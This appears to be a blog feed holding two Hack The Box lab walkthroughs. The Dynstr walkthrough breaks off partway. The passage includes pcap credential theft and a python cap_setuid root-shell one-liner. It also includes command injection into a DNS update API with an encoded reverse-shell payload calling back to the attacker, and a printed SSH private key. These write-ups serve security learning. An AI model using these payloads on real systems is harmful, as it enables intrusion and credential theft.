        "excerpt":"Hello guys!   This week’s machine will be Cap, another easy-rated Linux box from Hack The Box, created by InfoSecJack.   :information_source: Info: Write-ups for Hack The Box machines are posted as soon as they’re retired.      This box was very easy and demonstrates why we have to always secure communication while accessing services, which was the way we could get the credentials to escalate privileges to root.   Enumeration   As usual, started with a nmap quick scan to list the currently published services.   $ nmap -sC -sV -Pn -oA quick 10.10.10.245 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 20:04 -03 Nmap scan report for 10.10.10.245 Host is up (0.073s latency). Not shown: 997 closed ports PORT   STATE SERVICE VERSION 21/tcp open  ftp     vsftpd 3.0.3 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA) |   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA) |_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519) 80/tcp open  http    gunicorn | fingerprint-strings: |   FourOhFourRequest: |     HTTP/1.0 404 NOT FOUND |     Server: gunicorn |     Date: Tue, 10 Aug 2021 23:04:20 GMT |     Connection: close |     Content-Type: text/html; charset=utf-8 |     Content-Length: 232 |     &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"&gt; |     &lt;title&gt;404 Not Found&lt;/title&gt; |     &lt;h1&gt;Not Found&lt;/h1&gt; |     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt; |   GetRequest: |     HTTP/1.0 200 OK |     Server: gunicorn |     Date: Tue, 10 Aug 2021 23:04:15 GMT |     Connection: close |     Content-Type: text/html; charset=utf-8 |     Content-Length: 19386 |     &lt;!DOCTYPE html&gt; |     &lt;html class=\"no-js\" lang=\"en\"&gt; |     &lt;head&gt; |     &lt;head&gt; |     &lt;meta charset=\"utf-8\"&gt; |     &lt;meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\"&gt; |     &lt;title&gt;Security Dashboard&lt;/title&gt; |     &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt; |     &lt;link rel=\"shortcut icon\" type=\"image/png\" href=\"/static/images/icon/favicon.ico\"&gt; |     &lt;link rel=\"stylesheet\" href=\"/static/css/bootstrap.min.css\"&gt; |     &lt;link rel=\"stylesheet\" href=\"/static/css/font-awesome.min.css\"&gt; |     &lt;link rel=\"stylesheet\" href=\"/static/css/themify-icons.css\"&gt; |     &lt;link rel=\"stylesheet\" href=\"/static/css/metisMenu.css\"&gt; |     &lt;link rel=\"stylesheet\" href=\"/static/css/owl.carousel.min.css\"&gt; |     &lt;link rel=\"stylesheet\" href=\"/static/css/slicknav.min.css\"&gt; |     &lt;!-- amchar |   HTTPOptions: |     HTTP/1.0 200 OK |     Server: gunicorn |     Date: Tue, 10 Aug 2021 23:04:15 GMT |     Connection: close |     Content-Type: text/html; charset=utf-8 |     Allow: GET, HEAD, OPTIONS |     Content-Length: 0 |   RTSPRequest: |     HTTP/1.1 400 Bad Request |     Connection: close |     Content-Type: text/html |     Content-Length: 196 |     &lt;html&gt; |     &lt;head&gt; |     &lt;title&gt;Bad Request&lt;/title&gt; |     &lt;/head&gt; |     &lt;body&gt; |     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt; |     Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27; |     &lt;/body&gt; |_    &lt;/html&gt; |_http-server-header: gunicorn |_http-title: Security Dashboard 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port80-TCP:V=7.91%I=7%D=8/10%Time=611305F3%P=x86_64-pc-linux-gnu%r(GetR SF:equest,2FE5,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20 SF:Tue,\\x2010\\x20Aug\\x202021\\x2023:04:15\\x20GMT\\r\\nConnection:\\x20close\\r\\ SF:nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20193 SF:86\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20class=\\\"no-js\\\"\\x20lang=\\\"en\\\"&gt;\\ SF:n\\n&lt;head&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20charset=\\\"utf-8\\\"&gt;\\n\\x20\\x20\\x20\\x2 SF:0&lt;meta\\x20http-equiv=\\\"x-ua-compatible\\\"\\x20content=\\\"ie=edge\\\"&gt;\\n\\x20\\ SF:x20\\x20\\x20&lt;title&gt;Security\\x20Dashboard&lt;/title&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\ SF:x20name=\\\"viewport\\\"\\x20content=\\\"width=device-width,\\x20initial-scale= SF:1\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"shortcut\\x20icon\\\"\\x20type=\\\"image SF:/png\\\"\\x20href=\\\"/static/images/icon/favicon\\.ico\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt; SF:link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"/static/css/bootstrap\\.min\\.css\\\"&gt; SF:\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"/static/css/fon SF:t-awesome\\.min\\.css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20 SF:href=\\\"/static/css/themify-icons\\.css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel= SF:\\\"stylesheet\\\"\\x20href=\\\"/static/css/metisMenu\\.css\\\"&gt;\\n\\x20\\x20\\x20\\x2 SF:0&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"/static/css/owl\\.carousel\\.min\\. SF:css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"/static/c SF:ss/slicknav\\.min\\.css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;!--\\x20amchar\")%r(HTTPOption SF:s,B3,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20Tue,\\x2 SF:010\\x20Aug\\x202021\\x2023:04:15\\x20GMT\\r\\nConnection:\\x20close\\r\\nConten SF:t-Type:\\x20text/html;\\x20charset=utf-8\\r\\nAllow:\\x20GET,\\x20HEAD,\\x20OP SF:TIONS\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(RTSPRequest,121,\"HTTP/1\\.1\\x2 SF:0400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nContent-Type:\\x20text SF:/html\\r\\nContent-Length:\\x20196\\r\\n\\r\\n&lt;html&gt;\\n\\x20\\x20&lt;head&gt;\\n\\x20\\x20 SF:\\x20\\x20&lt;title&gt;Bad\\x20Request&lt;/title&gt;\\n\\x20\\x20&lt;/head&gt;\\n\\x20\\x20&lt;body&gt;\\ SF:n\\x20\\x20\\x20\\x20&lt;h1&gt;&lt;p&gt;Bad\\x20Request&lt;/p&gt;&lt;/h1&gt;\\n\\x20\\x20\\x20\\x20Invali SF:d\\x20HTTP\\x20Version\\x20&amp;#x27;Invalid\\x20HTTP\\x20Version:\\x20&amp;#x27;RTSP SF:/1\\.0&amp;#x27;&amp;#x27;\\n\\x20\\x20&lt;/body&gt;\\n&lt;/html&gt;\\n\")%r(FourOhFourRequest,189 SF:,\"HTTP/1\\.0\\x20404\\x20NOT\\x20FOUND\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20T SF:ue,\\x2010\\x20Aug\\x202021\\x2023:04:20\\x20GMT\\r\\nConnection:\\x20close\\r\\n SF:Content-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20232\\ SF:r\\n\\r\\n&lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\\"-//W3C//DTD\\x20HTML\\x203\\.2\\x20 SF:Final//EN\\\"&gt;\\n&lt;title&gt;404\\x20Not\\x20Found&lt;/title&gt;\\n&lt;h1&gt;Not\\x20Found&lt;/h1&gt; SF:\\n&lt;p&gt;The\\x20requested\\x20URL\\x20was\\x20not\\x20found\\x20on\\x20the\\x20ser SF:ver\\.\\x20If\\x20you\\x20entered\\x20the\\x20URL\\x20manually\\x20please\\x20ch SF:eck\\x20your\\x20spelling\\x20and\\x20try\\x20again\\.&lt;/p&gt;\\n\"); Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 137.56 seconds   80/TCP - HTTP Service   Observing the published page, we can see a monitoring dashboard with some options on the left.      Inspecting the options provided in the left pane, the only interesting feature was the Security Snapshot (5 Second PCAP + Analysis), which summarizes the package count received in the last interval. The panel option redirects us to http://10.10.10.245/capture and right after the 5-second interval, we’re redirected to the summarized data, as seen in the address bar http://10.10.10.245/data/1. On this page, you can also download the pcap file generated during the capture, which can be analyzed by yourself using a command line or graphical tools like Wireshark.      An interesting point is that when I have requested another capture, the redirected URL provided was sequential (http://10.10.10.245/data/2), which implies that we could be able to see previous captures as well.   Considering that the counter is incrementing, we might have capture registered at “0” so manually changed the URL in the address bar and the stats below were displayed, indicating that we had some conversation and possibly, if communication is unencrypted, we would be able to obtain sensitive data from it.      Analyzing its content using Wireshark, started analyzing the conversation statistics (Statistics &gt; Conversations), we can see below, having 3 HTTP conversations (80/TCP) and one FTP (21/TCP)      Analyzing each TCP Stream the most interesting one was the last (stream 3) which, in this FTP communication, we can see the credentials provided for user nathan and the retrieved file notes.txt, that could contain important information to us during this box resolution      nathan:Buck3tH4TF0RM3!       Initial access and User flag   Using the observed credentials, was able to connect to FTP and surprisingly the root directory is at the user’s home directory, where I was able to retrieve the user.txt file and read the flag   $ ftp 10.10.10.245 Connected to 10.10.10.245. 220 (vsFTPd 3.0.3) Name (10.10.10.245:zurc): nathan 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x    3 1001     1001         4096 May 27 09:16 . drwxr-xr-x    3 0        0            4096 May 23 19:17 .. lrwxrwxrwx    1 0        0               9 May 15 21:40 .bash_history -&gt; /dev/null -rw-r--r--    1 1001     1001          220 Feb 25  2020 .bash_logout -rw-r--r--    1 1001     1001         3771 Feb 25  2020 .bashrc drwx------    2 1001     1001         4096 May 23 19:17 .cache -rw-r--r--    1 1001     1001          807 Feb 25  2020 .profile lrwxrwxrwx    1 0        0               9 May 27 09:16 .viminfo -&gt; /dev/null -r--------    1 1001     1001           33 Aug 11 16:25 user.txt 226 Directory send OK. ftp&gt; get user.txt local: user.txt remote: user.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for user.txt (33 bytes). 226 Transfer complete. 33 bytes received in 0.00 secs (358.0729 kB/s) ftp&gt; exit 221 Goodbye.  $ cat user.txt &lt;redacted&gt;   Root flag   After reading the user’s flag, gave a try with the same credentials to connect via SSH and succeeded, allowing us to enumerate the box.   The first thing privesc command to be executed as always was sudo -l but for nathan’s account got nothing. Following with a manual enumeration decided to check if we have read access to the application directory, which is hosted in the default dir (/var/www/html) and is a python-based web app, from app.py file, to which nathan has write access.   nathan@cap:/var/www/html$ ls -la total 32 drwxr-xr-x 6 nathan nathan 4096 May 25 07:25 . drwxr-xr-x 3 root   root   4096 May 23 19:17 .. drwxr-xr-x 2 nathan nathan 4096 May 27 09:10 __pycache__ -rw-r--r-- 1 nathan nathan 4293 May 25 07:25 app.py drwxr-xr-x 6 root   root   4096 May 23 19:17 static drwxr-xr-x 2 root   root   4096 May 23 19:17 templates drwxr-xr-x 2 root   root   4096 May 31 16:17 upload   As checking the functions on the file, noticed that it executes tcpdump, which normally requires root permissions to this task. This permission could also be leveraged to spawn a reverse shell as root to the attacker machine.   To test this, created another route in the app, with a custom path but to be effective I would need to recycle the flask website, not done automatically and this shouldn’t be the correct path to root.   Going a little deeper, decided to run linpeas.sh and found one configuration that could help us with this privilege escalation: there are some files with uncommon capabilities, which were validated later in GTFOBins:   ╔══════════╣ Capabilities ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities Current capabilities: Current: = CapInh: 0000000000000000 CapPrm: 0000000000000000 CapEff: 0000000000000000 CapBnd: 0000003fffffffff CapAmb: 0000000000000000  Shell capabilities: 0x0000000000000000= CapInh: 0000000000000000 CapPrm: 0000000000000000 CapEff: 0000000000000000 CapBnd: 0000003fffffffff CapAmb: 0000000000000000  Files with capabilities (limited to 50): /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip /usr/bin/ping = cap_net_raw+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep /usr/bin/mtr-packet = cap_net_raw+ep /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep   The most interesting file was /usr/bin/python3.8 that has the cap_setuid capability set, which, according to python | GTFOBins it can be exploited by changing the uid of the session using the command below, spanning another instance of /bin/sh and, from it, was able to read root’s flag.   nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")' # id &amp;&amp; hostname &amp;&amp; cat /root/root.txt uid=0(root) gid=1001(nathan) groups=1001(nathan) cap &lt;redacted&gt;   I hope you guys have enjoyed it!   See you at the next post :smile:  ","categories": ["Walkthrough"],
        "tags": ["HackTheBox","HTB Easy","HTB Linux"],
        "url": "/walkthrough/2021/10/htb-cap",
        "teaser": "https://i.imgur.com/JkBtXmO.png"
      },{
        "title": "Walktrough: HTB Dynstr",
        "excerpt":"Hello guys!   This week’s machine will be Dynstr, another medium-rated Linux box from Hack The Box, created by jkr.   :information_source: Info: Write-ups for Hack The Box machines are posted as soon as they’re retired.      Had the opportunity to learn a lot with this box. First while playing with some code injection dictionaries, and later understanding the nsupdate utility. After getting the code execution and reverse shell, found an RSA private key to be used with SSH, but had to overcome some restrictions on the authorized_keys file to get another user account. Finally, to get root, played with globbing to get an escalation opportunity on the box.   I hope you guys enjoy it!   Enumeration   As usual, started enumerating published services using a nmap quick scan.   $ nmap -sC -sV -Pn -oA quick 10.10.10.244 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 18:32 -03 Nmap scan report for 10.10.10.244 Host is up (0.072s latency). Not shown: 997 closed ports PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA) |   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA) |_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519) 53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux) | dns-nsid: |_  bind.version: 9.16.1-Ubuntu 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Dyna DNS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.02 seconds   Checking the initial scan output we can see a DNS Service, as well as an HTTP website published. Before looking into the DNS Service, let’s see which kind of information the website can give us.   80/TCP - HTTP Service   Accessing the webpage, as mentioned in the title, talks about a Dyna DNS company, a company like No-IP which allows you to register a DNS entry and dynamically update it, making it easier to access your resources when you don’t own a static IP address.      Besides a single-page application, this website contains especially useful information in the section Our Services, that will be valuable to us during this box resolution, as well as the domain dynadns.htb, used in the e-mail address in the footer:         Application for DNS registration uses the same API as no-ip.com, as available in their documentation at Integrate with No-IP DDNS - API Information (noip.com).   The domains that could be used for this service are listed, which were later added to the local hosts file.   Demo credentials were provided, so we can start playing with the API :smile:   Interacting with the API   According to No-IP documentation, the API can be found at /nic/update and requires Basic authentication, where a GET request containing the IP and the hostname to be updated is the main feature of this API, as the example below:   $ echo -n 'dynadns:sndanyd' | base64 ZHluYWRuczpzbmRhbnlk $ curl -i -s -k -H $'Authorization: Basic ZHluYWRuczpzbmRhbnlk' \"http://10.10.10.244/nic/update?myip=10.10.10.10&amp;hostname=myhostname.no-ip.htb\" -v *   Trying 10.10.10.244:80... * Connected to 10.10.10.244 (10.10.10.244) port 80 (#0) &gt; GET /nic/update?myip=10.10.10.10&amp;hostname=myhostname.no-ip.htb HTTP/1.1 &gt; Host: 10.10.10.244 &gt; User-Agent: curl/7.74.0 &gt; Accept: */* &gt; Authorization: Basic ZHluYWRuczpzbmRhbnlk &gt; * Mark bundle as not supporting multiuse &lt; HTTP/1.1 200 OK HTTP/1.1 200 OK &lt; Date: Fri, 13 Aug 2021 21:36:36 GMT Date: Fri, 13 Aug 2021 21:36:36 GMT &lt; Server: Apache/2.4.41 (Ubuntu) Server: Apache/2.4.41 (Ubuntu) &lt; Content-Length: 18 Content-Length: 18 &lt; Content-Type: text/html; charset=UTF-8 Content-Type: text/html; charset=UTF-8  &lt; good 10.10.10.10 * Connection #0 to host 10.10.10.244 left intact   Playing a little with the API started receiving some wrngdom errors when some of the supported domains are not present, like below:   $ curl -i -s -k -H $'Authorization: Basic ZHluYWRuczpzbmRhbnlk' \"http://10.10.10.244/nic/update?myip=10.10.10.10&amp;hostname=;pwd\" -v *   Trying 10.10.10.244:80... * Connected to 10.10.10.244 (10.10.10.244) port 80 (#0) &gt; GET /nic/update?myip=10.10.10.10&amp;hostname=;pwd HTTP/1.1 &gt; Host: 10.10.10.244 &gt; User-Agent: curl/7.74.0 &gt; Accept: */* &gt; Authorization: Basic ZHluYWRuczpzbmRhbnlk &gt; * Mark bundle as not supporting multiuse &lt; HTTP/1.1 200 OK HTTP/1.1 200 OK &lt; Date: Fri, 13 Aug 2021 21:38:23 GMT Date: Fri, 13 Aug 2021 21:38:23 GMT &lt; Server: Apache/2.4.41 (Ubuntu) Server: Apache/2.4.41 (Ubuntu) &lt; Content-Length: 16 Content-Length: 16 &lt; Content-Type: text/html; charset=UTF-8 Content-Type: text/html; charset=UTF-8  &lt; 911 [wrngdom: ] * Connection #0 to host 10.10.10.244 left intact   So, to check for injections started to fuzz using a simple while loop for contents of wordlist /usr/share/wordlists/wfuzz/Injections/All_attack.txt, until getting the error below:   $ while read p; do while&gt; curl -i -s -k -H $'Authorization: Basic ZHluYWRuczpzbmRhbnlk' \"http://10.10.10.244/nic/update?myip=10.10.10.10&amp;hostname==$p.no-ip.htb\" -v while&gt; done &lt; /usr/share/wordlists/wfuzz/Injections/All_attack.txt  [...] * Connection #0 to host 10.10.10.244 left intact *   Trying 10.10.10.244:80... * Connected to 10.10.10.244 (10.10.10.244) port 80 (#0) &gt; GET /nic/update?myip=10.10.10.10&amp;hostname=-1.no-ip.htb HTTP/1.1 &gt; Host: 10.10.10.244 &gt; User-Agent: curl/7.74.0 &gt; Accept: */* &gt; Authorization: Basic ZHluYWRuczpzbmRhbnlk &gt; * Mark bundle as not supporting multiuse &lt; HTTP/1.1 200 OK HTTP/1.1 200 OK &lt; Date: Fri, 13 Aug 2021 21:30:11 GMT Date: Fri, 13 Aug 2021 21:30:11 GMT &lt; Server: Apache/2.4.41 (Ubuntu) Server: Apache/2.4.41 (Ubuntu) &lt; Content-Length: 22 Content-Length: 22 &lt; Content-Type: text/html; charset=UTF-8 Content-Type: text/html; charset=UTF-8  &lt; 911 [nsupdate failed]   As it mentions that nsupdate has failed with the payload sent (in this case -1.no-ip.htb) this means that the API triggers this binary in a non-interactive way. Doing some research, I have found on this page Using the dynamic DNS editor, nsupdate (rtfm-sarl.ch) some examples of usage that could be hijacked to get code execution in the backend, once it accepts standard input, which might be the way used in the automation that updates DNS entries in the zones.   To prove if this is correct, I made a simple test, encapsulating the commands I wanted to be executed in $(), and checked the DNS entry using dig, which returned success.      $ dig @10.10.10.244 mytestsubdomain.no-ip.htb  ; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; @10.10.10.244 mytestsubdomain.no-ip.htb ; (1 server found) ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 20816 ;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; WARNING: recursion requested but not available  ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: c46a9e70a58d51c501000000611a665bf50e119ef07ea985 (good) ;; QUESTION SECTION: ;mytestsubdomain.no-ip.htb.     IN      A  ;; ANSWER SECTION: mytestsubdomain.no-ip.htb. 30   IN      A       10.10.10.11  ;; Query time: 68 msec ;; SERVER: 10.10.10.244#53(10.10.10.244) ;; WHEN: Mon Aug 16 10:21:33 -03 2021 ;; MSG SIZE  rcvd: 98   Now that we have confirmed that we can get code execution this way, modified the request to start a reverse shell using a base64 encoded payload, avoiding encoding issues   GET /nic/update?myip=10.10.10.11&amp;hostname=%24%28%65%63%68%6f%20%63%6d%30%67%4c%33%52%74%63%43%39%6d%4f%32%31%72%5a%6d%6c%6d%62%79%41%76%64%47%31%77%4c%32%59%37%59%32%46%30%49%43%39%30%62%58%41%76%5a%6e%77%76%59%6d%6c%75%4c%33%4e%6f%49%43%31%70%49%44%49%2b%4a%6a%46%38%62%6d%4d%67%4d%54%41%75%4d%54%41%75%4d%54%51%75%4d%54%49%78%49%44%51%30%4e%44%4d%67%50%69%39%30%62%58%41%76%5a%67%3d%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%29.no-ip.htb HTTP/1.1 Host: 10.10.10.244 User-Agent: python-requests/2.25.1 Accept-Encoding: gzip, deflate Accept: */* Connection: close Authorization: Basic ZHluYWRuczpzbmRhbnlk   User flag   Started enumeration using the obtained account www-data, default for apache, using linpeas.sh, where the following items were identified:      Users with console and their permissions:   uid=0(root) gid=0(root) groups=0(root) uid=1000(dyna) gid=1000(dyna) groups=1000(dyna),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare) uid=1001(bindmgr) gid=1001(bindmgr) groups=1001(bindmgr)      Ability to list files inside others home directories, where we can see some SSH Keys for bindmgr account   ╔══════════╣ Files inside others home (limit 20)                                                                             /home/bindmgr/support-case-C62796521/strace-C62796521.txt /home/bindmgr/support-case-C62796521/C62796521-debugging.script /home/bindmgr/support-case-C62796521/C62796521-debugging.timing /home/bindmgr/support-case-C62796521/command-output-C62796521.txt /home/bindmgr/user.txt /home/bindmgr/.ssh/known_hosts /home/bindmgr/.ssh/id_rsa.pub /home/bindmgr/.ssh/authorized_keys /home/bindmgr/.ssh/id_rsa /home/bindmgr/.bashrc /home/bindmgr/.bash_logout /home/bindmgr/.profile /home/dyna/.bashrc /home/dyna/.bash_logout /home/dyna/.profile /home/dyna/.sudo_as_admin_successful   Checking the contents of /home/bindmgr, we can see the user.txt file but we have no read rights on it. In this user’s profile, there’s also a folder called support-case-C62796521, which contains some debugging/tracing output from some tasks executed in the server.   www-data@dynstr:/var/www$ ls -la /home/bindmgr/ total 36 drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 . drwxr-xr-x 4 root    root    4096 Mar 15 20:26 .. lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -&gt; /dev/null -rw-r--r-- 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout -rw-r--r-- 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache -rw-r--r-- 1 bindmgr bindmgr  807 Feb 25  2020 .profile drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521 -r-------- 1 bindmgr bindmgr   33 Aug 16 15:49 user.txt www-data@dynstr:/var/www$   After analyzing the files, noticed that in strace-C62796521.txt we have the private key in plain text, which was extracted and saved as an id_rsa file.   [...] 15123 read(5, \"-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\\n-----END OPENSSH PRIVATE KEY-----\\n\", 4096) = 1823 [...]   When I tried to SSH to bindmgr account using this key, noticed that it failed. Checking the contents of authorized_keys file, verified that we have a from option defined, that will prevent us from accessing the account using that key if not registered as a *.infra.dyna.htb subdomain.   www-data@dynstr:/tmp$ cat /home/bindmgr/.ssh/authorized_keys from=\"*.infra.dyna.htb\" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen   To achieve that, we would need to edit the hosts file, not possible with current credentials, but we could also leverage nsupdate to include our DNS entry into the infra.dyna.htb zone, where I’ve captured the command used in the API to be reused in our scenario:   // Update DNS entry $cmd = sprintf(\"server 127.0.0.1\\nzone %s\\nupdate delete %s.%s\\nupdate add %s.%s 30 IN A %s\\nsend\\n\",$d,$h,$d,$h,$d,$myip); system('echo \"'.$cmd.'\" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key',$retval);   Based on that, crafted the following command line to add our IP as a known subdomain   www-data@dynstr:/dev/shm$ cat nsupdate server 127.0.0.1 zone dyna.htb update delete 